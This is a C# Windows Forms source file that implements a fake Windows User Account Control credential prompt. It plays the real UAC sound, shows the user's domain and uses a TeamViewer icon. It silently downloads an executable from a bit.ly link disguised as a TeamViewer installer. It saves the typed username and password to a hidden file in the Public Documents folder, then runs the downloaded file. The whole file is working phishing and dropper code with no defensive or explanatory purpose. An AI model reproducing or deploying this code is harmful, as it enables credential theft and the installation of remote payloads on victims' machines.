using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace uac
{
    public partial class Form1 : Form
    {
        private static string currentUserName = Environment.UserName;
        private static string currentDomain = Environment.UserDomainName;
        private static string fileUrl = "https://bit.ly/40dN90f";
        private static string fileName = @"C:\Users\" + currentUserName + @"\Downloads\TeamViewer_Setup_x64.exe";
        public Form1()
        {
            InitializeComponent();
            this.CenterToScreen();
            this.FormBorderStyle = FormBorderStyle.None;
            SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows User Account Control.wav");
            sound.Play();
            this.label4.Text = currentDomain;
            this.Icon = Properties.Resources.TeamViewer_Logo_Icon_Only;
            downloadExe();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.textBox1.Text = "User name";
            this.textBox2.Text = "Password";
            this.textBox1.ForeColor = Color.Gray;
            this.textBox2.ForeColor = Color.Gray;
        }

        private void textBox1_Enter(object sender, EventArgs e)
        {
            if(textBox1.Text == "User name")
            {
                this.textBox1.ForeColor = Color.Black;
                this.textBox1.Text = "";
            }
        }

        private void textBox1_Leave(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                this.textBox1.ForeColor = Color.Gray;
                this.textBox1.Text = "User name";
            }
        }

        private void textBox2_Enter(object sender, EventArgs e)
        {
            if (textBox2.Text == "Password")
            {
                this.textBox2.ForeColor = Color.Black;
                this.textBox2.Text = "";
                this.textBox2.PasswordChar = '●';
            }
        }

        private void textBox2_Leave(object sender, EventArgs e)
        {
            if (textBox2.Text == "")
            {
                this.textBox2.ForeColor = Color.Gray;
                this.textBox2.Text = "Password";
                this.textBox2.PasswordChar = '\0';
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Thread.Sleep(2000);
            string computerName = Environment.MachineName;
            string formatted = string.Format("{0};{1}", this.textBox1.Text.ToString(), this.textBox2.Text.ToString());
            if (File.Exists(@"C:\Users\Public\Documents\creds.txt"))
            {
                File.Delete(@"C:\Users\Public\Documents\creds.txt");
            }
            using (StreamWriter writer = new StreamWriter(@"C:\Users\Public\Documents\creds.txt"))
            {
                writer.WriteLine(formatted);
            }
            File.SetAttributes(@"C:\Users\Public\Documents\creds.txt", FileAttributes.Hidden);

            //DialogResult result = MessageBox.Show("Failed to authenticate user.\n\nAccess denied or timeout expired\nCheck if you have local administrator privilages on computer '" + computerName + "'\n\nPossible reasons:\n1. Invalid credentials" , "User Account Control", MessageBoxButtons.OK, MessageBoxIcon.Error);

            Process.Start(fileName);
            Close();
        }

        public void downloadExe()
        {
            using (WebClient client = new WebClient())
            {

                client.DownloadFileAsync(new Uri(fileUrl), fileName);
            }
        }
    }
}
